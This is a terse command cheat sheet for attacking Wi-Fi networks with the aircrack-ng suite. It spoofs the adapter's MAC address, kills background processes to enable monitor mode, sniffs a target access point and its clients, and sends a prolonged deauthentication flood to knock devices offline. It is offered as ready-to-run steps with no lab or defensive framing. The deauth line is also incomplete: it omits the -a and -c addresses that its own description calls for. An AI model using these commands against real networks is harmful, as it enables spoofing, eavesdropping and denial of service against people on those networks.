### Changes MAC address

sudo ifconfig wlan0 down

sudo ifconfig wlan0 hw ether xx:xx:xx:xx:xx:xx

sudo ifconfig wlan0 up

*************************************************

### Check wireless card adapter

airmon-ng 

*************************************************

### Start airmon-ng by killing the processes in the background. Then use the command to start monitor mode on wlan0 (if that is the wcard you got from the first command)

airmon-ng check kill 
airmon-ng start wlan0 

*************************************************

### For monitoring

airodump-ng wlan0mon

*************************************************

### For monitoring a specific network's users (change channel to its channel and the mac address to the AP's)

airodump-ng --channel 6 --bssid xx:xx:xx:xx:xx:xx wlan0mon

*************************************************

### To deauth: Change 2000 to a higher number for a prolonged effect. Change the first MAC address to the one of the AP to impersonate (-a) and the second to the device's to deauth (-c). Think of -a for AP and -c for client

aireplay-ng --deauth 2000

*************************************************

### To stop and bring back the network adapter in managed mode (aka 'to see the wireless back')

airmon-ng stop wlan0mon
service networking restart
service network-manager restart

*************************************************
